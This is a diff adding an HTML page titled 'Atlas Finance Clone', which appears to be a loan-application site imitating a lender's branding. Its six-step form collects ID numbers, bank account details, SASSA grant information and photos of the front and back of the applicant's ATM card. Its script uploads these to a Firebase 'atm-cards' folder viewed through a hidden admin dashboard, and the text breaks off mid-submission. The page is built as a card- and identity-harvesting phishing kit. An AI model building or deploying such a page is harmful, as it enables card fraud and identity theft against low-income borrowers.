@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atlas Finance Clone</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-red: #CC0000;
+            --dark-red: #A00000;
+            --white: #FFFFFF;
+            --gray: #F4F4F4;
+            --text-dark: #333;
+            --success-green: #28a745;
+            --danger-red: #dc3545;
+            --warning-yellow: #ffc107;
+            --pending-gray: #6c757d;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: var(--gray);
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        /* Header */
+        header {
+            background-color: var(--primary-red);
+            color: var(--white);
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .menu-btn {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .logo {
+            text-align: center;
+            flex-grow: 1;
+            font-weight: 700;
+            text-transform: lowercase;
+            line-height: 0.9;
+            font-size: 1.4rem;
+        }
+
+        .logo span {
+            display: block;
+            font-size: 1.4rem;
+            font-weight: 800;
+        }
+
+        /* Hero Section - Updated to CASH LOANS style */
+        .hero {
+            background: linear-gradient(135deg, #CC0000 0%, #e63366 50%, #9b1fa8 100%);
+            color: var(--white);
+            padding: 50px 20px 60px;
+            text-align: left;
+            position: relative;
+            overflow: hidden;
+            min-height: 520px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            flex: 1;
+        }
+
+        .hero h1 {
+            font-size: 5.5rem;
+            font-weight: 900;
+            line-height: 1;
+            text-transform: uppercase;
+            letter-spacing: -2px;
+            margin-bottom: 0;
+        }
+
+        .hero-dots {
+            display: flex;
+            gap: 10px;
+            margin: 12px 0;
+        }
+
+        .hero-dot {
+            width: 10px;
+            height: 10px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .hero p.subtitle {
+            font-size: 1.15rem;
+            font-weight: 400;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            max-width: 260px;
+        }
+
+        .hero-family {
+            position: absolute;
+            bottom: 0;
+            right: -10px;
+            width: 55%;
+            max-width: 300px;
+            z-index: 2;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        .hero-family-placeholder {
+            width: 100%;
+            padding-bottom: 120%;
+            background: linear-gradient(180deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.15) 100%);
+            border-radius: 50% 50% 0 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-family-placeholder::after {
+            content: '👨‍👩‍👦';
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 80px;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+        }
+
+        .arc-hero {
+            position: absolute;
+            border: 18px solid rgba(255,255,255,0.15);
+            border-radius: 50%;
+            z-index: 1;
+        }
+
+        .arc-hero-1 {
+            width: 320px;
+            height: 320px;
+            bottom: -100px;
+            right: 30px;
+        }
+
+        .arc-hero-2 {
+            width: 200px;
+            height: 200px;
+            bottom: -60px;
+            right: 80px;
+        }
+
+        .cta-btn {
+            background-color: var(--white);
+            color: var(--primary-red);
+            padding: 14px 40px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 800;
+            display: inline-block;
+            border: none;
+            cursor: pointer;
+            font-size: 1.1rem;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+            position: relative;
+            z-index: 3;
+        }
+
+        .cta-btn:active { transform: scale(0.95); }
+
+        .carousel-dots {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background-color: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+        }
+
+        .dot.active {
+            background-color: var(--white);
+        }
+
+        /* Form Section */
+        .form-container {
+            max-width: 600px;
+            margin: -20px auto 40px;
+            background: var(--white);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 10;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: #eee;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--primary-red);
+            width: 16.66%;
+            transition: width 0.3s ease;
+        }
+
+        .step-label {
+            font-size: 0.75rem;
+            color: #999;
+            margin-bottom: 20px;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 12px 25px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .btn-next { background: var(--primary-red); color: white; }
+        .btn-prev { background: #ccc; color: #333; }
+
+        /* Conditional fields */
+        .conditional-fields {
+            display: none;
+        }
+
+        /* File upload styling */
+        .file-upload-box {
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+            position: relative;
+        }
+
+        .file-upload-box:hover {
+            border-color: var(--primary-red);
+        }
+
+        .file-upload-box input[type="file"] {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            cursor: pointer;
+            width: 100%;
+            height: 100%;
+        }
+
+        .file-upload-box .upload-icon {
+            font-size: 2rem;
+            margin-bottom: 8px;
+        }
+
+        .file-upload-box p {
+            font-size: 0.85rem;
+            color: #999;
+        }
+
+        .file-preview {
+            margin-top: 10px;
+            max-width: 100%;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .file-name {
+            font-size: 0.8rem;
+            color: var(--primary-red);
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Slider */
+        .slider-container {
+            margin: 20px 0;
+        }
+
+        .slider-value {
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-red);
+            margin-bottom: 10px;
+        }
+
+        /* Status checker section */
+        .status-checker {
+            max-width: 600px;
+            margin: 0 auto 40px;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .status-checker h3 {
+            margin-bottom: 15px;
+            color: var(--primary-red);
+        }
+
+        .status-checker input {
+            margin-bottom: 15px;
+        }
+
+        .status-result {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--primary-red);
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin: 20px 0;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 0.9rem;
+        }
+
+        /* WhatsApp Button */
+        .whatsapp-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: #25D366;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            z-index: 1000;
+            color: white;
+            text-decoration: none;
+            font-size: 30px;
+        }
+
+        /* Admin Section */
+        #admin-section {
+            display: none;
+            padding: 20px;
+            background: white;
+            min-height: 100vh;
+        }
+
+        .admin-login {
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 30px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+        }
+
+        .dashboard-stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .stat-card {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border-left: 4px solid var(--primary-red);
+        }
+
+        .stat-card .stat-number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary-red);
+        }
+
+        .stat-card .stat-label {
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        .dashboard-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            font-size: 0.85rem;
+        }
+
+        .dashboard-table th, .dashboard-table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+
+        .dashboard-table th {
+            background: #f8f9fa;
+        }
+
+        .dashboard-table tr {
+            cursor: pointer;
+        }
+
+        .dashboard-table tr:hover {
+            background: #fff5f5;
+        }
+
+        /* Expanded row details */
+        .detail-row {
+            display: none;
+            background: #fafafa;
+        }
+
+        .detail-row td {
+            padding: 20px;
+        }
+
+        .detail-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+        }
+
+        .detail-item label {
+            font-weight: 600;
+            color: #666;
+            font-size: 0.75rem;
+        }
+
+        .detail-item p {
+            font-size: 0.9rem;
+            color: #333;
+        }
+
+        .card-images {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .card-image-box {
+            flex: 1;
+            min-width: 140px;
+        }
+
+        .card-image-box label {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #666;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .card-image-box img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+        }
+
+        .badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge-pending { background: var(--pending-gray); text-transform: capitalize; }
+        .badge-approved { background: var(--success-green); text-transform: capitalize; }
+        .badge-rejected { background: var(--danger-red); text-transform: capitalize; }
+        .badge-flagged { background: var(--warning-yellow); color: black; text-transform: capitalize; }
+
+        .action-btn {
+            padding: 5px 10px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-right: 5px;
+            font-size: 0.7rem;
+            color: white;
+        }
+
+        .btn-approve { background: var(--success-green); }
+        .btn-reject { background: var(--danger-red); }
+        .btn-flag { background: var(--warning-yellow); color: black; }
+
+        /* Success screen */
+        .success-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-screen .checkmark {
+            font-size: 4rem;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .form-container { margin: -20px 15px 40px; }
+            .dashboard-table { display: block; overflow-x: auto; }
+            .hero h1 { font-size: 4rem; }
+            .dashboard-stats { grid-template-columns: repeat(2, 1fr); }
+            .detail-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="main-site">
+        <header>
+            <div class="menu-btn">☰</div>
+            <div class="logo">
+                atlas<br><span>finance</span>
+            </div>
+            <div style="width: 24px;"></div>
+        </header>
+
+        <!-- Updated Hero Section -->
+        <section class="hero">
+            <div class="arc-hero arc-hero-1"></div>
+            <div class="arc-hero arc-hero-2"></div>
+
+            <div class="hero-content">
+                <h1>CASH<br>LOANS</h1>
+                <div class="hero-dots">
+                    <div class="hero-dot"></div>
+                    <div class="hero-dot"></div>
+                    <div class="hero-dot"></div>
+                </div>
+                <p class="subtitle">Get up to R20,000 with flexible payment terms</p>
+                <button class="cta-btn" onclick="document.getElementById('loan-form').scrollIntoView({behavior: 'smooth'})">Apply</button>
+            </div>
+
+            <div class="hero-family">
+                <div class="hero-family-placeholder"></div>
+            </div>
+
+            <div class="carousel-dots" style="position: absolute; bottom: 15px; left: 50%; transform: translateX(-50%); z-index: 3;">
+                <div class="dot active"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </section>
+
+        <!-- Loan Form -->
+        <div class="form-container" id="loan-form">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+            <div class="step-label" id="step-label">Step 1 of 6</div>
+
+            <form id="application-form">
+                <!-- Step 1: Personal Details -->
+                <div class="step active" id="step-1">
+                    <h3>Personal Details</h3>
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" name="fullName" required>
+                    </div>
+                    <div class="form-group">
+                        <label>ID Number</label>
+                        <input type="text" name="idNumber" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Date of Birth</label>
+                        <input type="date" name="dob" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Gender</label>
+                        <select name="gender" required>
+                            <option value="">Select Gender</option>
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Marital Status</label>
+                        <select name="maritalStatus" required>
+                            <option value="">Select Status</option>
+                            <option value="Single">Single</option>
+                            <option value="Married">Married</option>
+                            <option value="Divorced">Divorced</option>
+                            <option value="Widowed">Widowed</option>
+                        </select>
+                    </div>
+                    <div class="btn-group">
+                        <div></div>
+                        <button type="button" class="btn btn-next" onclick="nextStep(1)">Next</button>
+                    </div>
+                </div>
+
+                <!-- Step 2: Contact Details -->
+                <div class="step" id="step-2">
+                    <h3>Contact Information</h3>
+                    <div class="form-group">
+                        <label>Phone Number</label>
+                        <input type="tel" name="phone" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Physical Address</label>
+                        <textarea name="address" rows="3" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>Province</label>
+                        <select name="province" required>
+                            <option value="">Select Province</option>
+                            <option value="Gauteng">Gauteng</option>
+                            <option value="Western Cape">Western Cape</option>
+                            <option value="KwaZulu-Natal">KwaZulu-Natal</option>
+                            <option value="Eastern Cape">Eastern Cape</option>
+                            <option value="Free State">Free State</option>
+                            <option value="Limpopo">Limpopo</option>
+                            <option value="Mpumalanga">Mpumalanga</option>
+                            <option value="North West">North West</option>
+                            <option value="Northern Cape">Northern Cape</option>
+                        </select>
+                    </div>
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-prev" onclick="prevStep(2)">Previous</button>
+                        <button type="button" class="btn btn-next" onclick="nextStep(2)">Next</button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Employment Details (Updated) -->
+                <div class="step" id="step-3">
+                    <h3>Employment Details</h3>
+                    <div class="form-group">
+                        <label>Employment Status</label>
+                        <select name="employmentStatus" id="employment-status" required onchange="handleEmploymentChange(this.value)">
+                            <option value="">Select Status</option>
+                            <option value="Employed">Employed</option>
+                            <option value="Self-Employed">Self-Employed</option>
+                            <option value="Unemployed">Unemployed</option>
+                            <option value="Grant Benefactor">Grant Benefactor</option>
+                        </select>
+                    </div>
+
+                    <!-- Employed / Self-Employed fields -->
+                    <div class="conditional-fields" id="employed-fields">
+                        <div class="form-group">
+                            <label>Employer Name</label>
+                            <input type="text" name="employerName">
+                        </div>
+                        <div class="form-group">
+                            <label>Monthly Income (R)</label>
+                            <input type="number" name="income">
+                        </div>
+                        <div class="form-group">
+                            <label>Pay Date</label>
+                            <input type="date" name="payDate">
+                        </div>
+                    </div>
+
+                    <!-- Grant Benefactor fields -->
+                    <div class="conditional-fields" id="grant-fields">
+                        <div class="form-group">
+                            <label>Grant Type</label>
+                            <select name="grantType">
+                                <option value="">Select Grant Type</option>
+                                <option value="SASSA Child Grant">SASSA Child Grant</option>
+                                <option value="Disability Grant">Disability Grant</option>
+                                <option value="Old Age Grant">Old Age Grant</option>
+                                <option value="Other">Other</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Grant Amount (R)</label>
+                            <input type="number" name="grantAmount">
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-prev" onclick="prevStep(3)">Previous</button>
+                        <button type="button" class="btn btn-next" onclick="nextStep(3)">Next</button>
+                    </div>
+                </div>
+
+                <!-- Step 4: Banking Details (New) -->
+                <div class="step" id="step-4">
+                    <h3>Banking Details</h3>
+                    <div class="form-group">
+                        <label>Bank Name</label>
+                        <select name="bankName" required>
+                            <option value="">Select Bank</option>
+                            <option value="FNB">FNB</option>
+                            <option value="Absa">Absa</option>
+                            <option value="Standard Bank">Standard Bank</option>
+                            <option value="Nedbank">Nedbank</option>
+                            <option value="Capitec">Capitec</option>
+                            <option value="African Bank">African Bank</option>
+                            <option value="TymeBank">TymeBank</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Account Number</label>
+                        <input type="text" name="accountNumber" required placeholder="Enter your account number">
+                    </div>
+                    <div class="form-group">
+                        <label>Account Type</label>
+                        <select name="accountType" required>
+                            <option value="">Select Account Type</option>
+                            <option value="Savings">Savings</option>
+                            <option value="Cheque/Current">Cheque/Current</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>ATM Card - Front View</label>
+                        <div class="file-upload-box" onclick="document.getElementById('card-front-input').click()">
+                            <input type="file" id="card-front-input" accept="image/*" onchange="previewFile(this, 'card-front-preview', 'card-front-name')">
+                            <div class="upload-icon">💳</div>
+                            <p>Tap to upload front of card</p>
+                            <p style="font-size: 0.75rem; margin-top: 4px;">JPG, PNG accepted</p>
+                            <span class="file-name" id="card-front-name"></span>
+                        </div>
+                        <img class="file-preview" id="card-front-preview" alt="Card Front Preview">
+                    </div>
+                    <div class="form-group">
+                        <label>ATM Card - Back View</label>
+                        <div class="file-upload-box" onclick="document.getElementById('card-back-input').click()">
+                            <input type="file" id="card-back-input" accept="image/*" onchange="previewFile(this, 'card-back-preview', 'card-back-name')">
+                            <div class="upload-icon">💳</div>
+                            <p>Tap to upload back of card</p>
+                            <p style="font-size: 0.75rem; margin-top: 4px;">JPG, PNG accepted</p>
+                            <span class="file-name" id="card-back-name"></span>
+                        </div>
+                        <img class="file-preview" id="card-back-preview" alt="Card Back Preview">
+                    </div>
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-prev" onclick="prevStep(4)">Previous</button>
+                        <button type="button" class="btn btn-next" onclick="nextStep(4)">Next</button>
+                    </div>
+                </div>
+
+                <!-- Step 5: Loan Details -->
+                <div class="step" id="step-5">
+                    <h3>Loan Requirements</h3>
+                    <div class="slider-container">
+                        <label>Loan Amount (R)</label>
+                        <div class="slider-value" id="amount-display">R 5,000</div>
+                        <input type="range" name="loanAmount" min="500" max="20000" step="500" value="5000" oninput="updateAmount(this.value)">
+                        <div style="display: flex; justify-content: space-between; font-size: 0.75rem; color: #999;">
+                            <span>R500</span><span>R20,000</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Loan Purpose</label>
+                        <select name="loanPurpose" required>
+                            <option value="">Select Purpose</option>
+                            <option value="Medical">Medical</option>
+                            <option value="Education">Education</option>
+                            <option value="Home Improvement">Home Improvement</option>
+                            <option value="Debt Consolidation">Debt Consolidation</option>
+                            <option value="Business">Business</option>
+                            <option value="Personal">Personal</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Repayment Term</label>
+                        <select name="repaymentTerm" required>
+                            <option value="1 Month">1 Month</option>
+                            <option value="3 Months">3 Months</option>
+                            <option value="6 Months">6 Months</option>
+                            <option value="12 Months">12 Months</option>
+                            <option value="24 Months">24 Months</option>
+                        </select>
+                    </div>
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-prev" onclick="prevStep(5)">Previous</button>
+                        <button type="button" class="btn btn-next" onclick="nextStep(5)">Review</button>
+                    </div>
+                </div>
+
+                <!-- Step 6: Review -->
+                <div class="step" id="step-6">
+                    <h3>Review Application</h3>
+                    <div id="review-content" style="font-size: 0.9rem; margin-bottom: 20px;"></div>
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-prev" onclick="prevStep(6)">Edit</button>
+                        <button type="submit" class="btn btn-next" id="submit-btn">Submit Application</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Status Checker -->
+        <div class="status-checker">
+            <h3>Check Application Status</h3>
+            <p style="font-size: 0.85rem; color: #666; margin-bottom: 15px;">Enter your email to check your loan application status</p>
+            <input type="email" id="status-email" placeholder="Enter your email address">
+            <button class="btn btn-next" style="width: 100%;" onclick="checkStatus()">Check Status</button>
+            <div class="status-result" id="status-result"></div>
+        </div>
+
+        <footer>
+            <div class="logo">
+                atlas<br><span>finance</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Contact</a>
+                <a href="#">Privacy Policy</a>
+            </div>
+            <p style="font-size: 0.8rem; opacity: 0.8;">&copy; 2026 Atlas Finance Clone. All rights reserved.</p>
+            <p style="margin-top: 20px; font-size: 0.7rem; cursor: pointer;" onclick="showAdminLogin()">Admin Login</p>
+        </footer>
+
+        <a href="https://wa.me/1234567890" class="whatsapp-btn">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="currentColor"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766 0-3.18-2.587-5.771-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.751-2.874-2.502-2.961-2.617-.087-.116-.708-.94-.708-1.793 0-.852.448-1.271.607-1.445.159-.173.346-.217.462-.217l.332.006c.106.005.249-.04.39.298.144.347.491 1.2.534 1.287.043.087.072.188.014.304-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86.174.088.275.073.376-.043.101-.116.433-.506.548-.68.116-.173.231-.145.39-.087.159.058 1.012.477 1.185.564.173.087.289.129.332.202.043.073.043.423-.101.827z"/></svg>
+        </a>
+    </div>
+
+    <!-- Admin Section -->
+    <div id="admin-section">
+        <div class="admin-login" id="admin-login-form">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div class="logo" style="color: var(--primary-red); font-size: 1.2rem;">atlas<br><span>finance</span></div>
+            </div>
+            <h2 style="margin-bottom: 20px; text-align: center; font-size: 1.2rem;">Admin Login</h2>
+            <div class="form-group">
+                <label>Email</label>
+                <input type="email" id="admin-email">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="admin-password">
+            </div>
+            <button class="btn btn-next" style="width: 100%;" onclick="handleAdminLogin()">Login</button>
+            <p style="text-align: center; margin-top: 15px; cursor: pointer; color: var(--primary-red);" onclick="hideAdmin()">← Back to Site</p>
+        </div>
+
+        <div id="admin-dashboard" style="display: none; padding: 20px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px;">
+                <h2 style="color: var(--primary-red);">Admin Dashboard</h2>
+                <button class="btn btn-prev" onclick="handleAdminLogout()">Logout</button>
+            </div>
+
+            <!-- Stats -->
+            <div class="dashboard-stats">
+                <div class="stat-card">
+                    <div class="stat-number" id="stat-total">0</div>
+                    <div class="stat-label">Total Applications</div>
+                </div>
+                <div class="stat-card" style="border-left-color: var(--pending-gray);">
+                    <div class="stat-number" style="color: var(--pending-gray);" id="stat-pending">0</div>
+                    <div class="stat-label">Pending</div>
+                </div>
+                <div class="stat-card" style="border-left-color: var(--success-green);">
+                    <div class="stat-number" style="color: var(--success-green);" id="stat-approved">0</div>
+                    <div class="stat-label">Approved</div>
+                </div>
+                <div class="stat-card" style="border-left-color: var(--danger-red);">
+                    <div class="stat-number" style="color: var(--danger-red);" id="stat-rejected">0</div>
+                    <div class="stat-label">Rejected</div>
+                </div>
+            </div>
+
+            <div style="overflow-x: auto;">
+                <table class="dashboard-table">
+                    <thead>
+                        <tr>
+                            <th>Date</th>
+                            <th>Name</th>
+                            <th>Phone</th>
+                            <th>Amount</th>
+                            <th>Status</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="applications-table-body"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAl7VPTQJtXDl2SSr5UV2BHOtXk8uMAXhg",
+            authDomain: "atlas-finance-clone.firebaseapp.com",
+            projectId: "atlas-finance-clone",
+            storageBucket: "atlas-finance-clone.firebasestorage.app",
+            messagingSenderId: "239696102501",
+            appId: "1:239696102501:web:1f22e4f19b2296d594728c"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const storage = firebase.storage();
+
+        // EmailJS Init
+        emailjs.init("G9_URc7W94VnzyNYo");
+
+        // Form Navigation
+        let currentStep = 1;
+        const totalSteps = 6;
+
+        function updateProgress() {
+            const fill = document.getElementById('progress-fill');
+            fill.style.width = (currentStep / totalSteps) * 100 + '%';
+            document.getElementById('step-label').innerText = `Step ${currentStep} of ${totalSteps}`;
+        }
+
+        function nextStep(step) {
+            if (validateStep(step)) {
+                document.getElementById(`step-${step}`).classList.remove('active');
+                currentStep = step + 1;
+                document.getElementById(`step-${currentStep}`).classList.add('active');
+                updateProgress();
+                if (currentStep === 6) populateReview();
+                window.scrollTo({ top: document.getElementById('loan-form').offsetTop - 20, behavior: 'smooth' });
+            }
+        }
+
+        function prevStep(step) {
+            document.getElementById(`step-${step}`).classList.remove('active');
+            currentStep = step - 1;
+            document.getElementById(`step-${currentStep}`).classList.add('active');
+            updateProgress();
+            window.scrollTo({ top: document.getElementById('loan-form').offsetTop - 20, behavior: 'smooth' });
+        }
+
+        function validateStep(step) {
+            if (step === 4) {
+                const bankName = document.querySelector('[name="bankName"]').value;
+                const accountNumber = document.querySelector('[name="accountNumber"]').value;
+                const accountType = document.querySelector('[name="accountType"]').value;
+                if (!bankName || !accountNumber || !accountType) {
+                    alert('Please fill in all banking details.');
+                    return false;
+                }
+                return true;
+            }
+            const inputs = document.querySelectorAll(`#step-${step} select[required], #step-${step} input[required], #step-${step} textarea[required]`);
+            for (let input of inputs) {
+                if (!input.value) {
+                    alert('Please fill in all required fields.');
+                    input.focus();
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        function updateAmount(val) {
+            document.getElementById('amount-display').innerText = 'R ' + parseInt(val).toLocaleString();
+        }
+
+        // Employment Status Conditional Logic
+        function handleEmploymentChange(value) {
+            const employedFields = document.getElementById('employed-fields');
+            const grantFields = document.getElementById('grant-fields');
+            employedFields.style.display = 'none';
+            grantFields.style.display = 'none';
+            if (value === 'Employed' || value === 'Self-Employed') {
+                employedFields.style.display = 'block';
+            } else if (value === 'Grant Benefactor') {
+                grantFields.style.display = 'block';
+            }
+        }
+
+        // File Preview
+        function previewFile(input, previewId, nameId) {
+            const file = input.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const preview = document.getElementById(previewId);
+                    preview.src = e.target.result;
+                    preview.style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+                const nameEl = document.getElementById(nameId);
+                nameEl.innerText = '✓ ' + file.name;
+                nameEl.style.display = 'block';
+            }
+        }
+
+        function populateReview() {
+            const form = document.getElementById('application-form');
+            const formData = new FormData(form);
+            const skipKeys = ['cardFront', 'cardBack'];
+            let html = '<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; border: 1px solid #eee; padding: 15px; border-radius: 8px; background: #fafafa;">';
+            formData.forEach((value, key) => {
+                if (skipKeys.includes(key)) return;
+                if (key === 'loanAmount') value = 'R ' + parseInt(value).toLocaleString();
+                const label = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
+                html += `<div style="font-weight: 600; color: #666; font-size: 0.8rem;">${label}:</div><div style="word-break: break-all; font-size: 0.85rem;">${value || 'N/A'}</div>`;
+            });
+            html += '</div>';
+            document.getElementById('review-content').innerHTML = html;
+        }
+
+        // Upload image to Firebase Storage
+        async function uploadCardImage(file, fileName) {
+            if (!file) return null;
+            const ref = storage.ref(`atm-cards/${Date.now()}_${fileName}`);
+            const snapshot = await ref.put(file);
+            return await snapshot.ref.getDownloadURL();
+        }
+
+        // Form Submission
+        document.getElementById('application-form').onsubmit = async (e) => {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submit-btn');
+            submitBtn.innerText = 'Submitting...';
+            submitBtn.disabled = true;
+
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
+            data.status = 'pending';
+            data.createdAt = firebase.firestore.FieldValue.serverTimestamp();
+
+            try {
+                // Upload card images
+                const cardFrontFile = document.getElementById('card-front-input').files[0];
+                const cardBackFile = document.getElementById('card-back-input').files[0];
+
+                if (cardFrontFile) {
+                    data.cardFrontUrl = await uploadCardImage(cardFrontFile, 'front.jpg');
+                }
+                if (cardBackFile) {
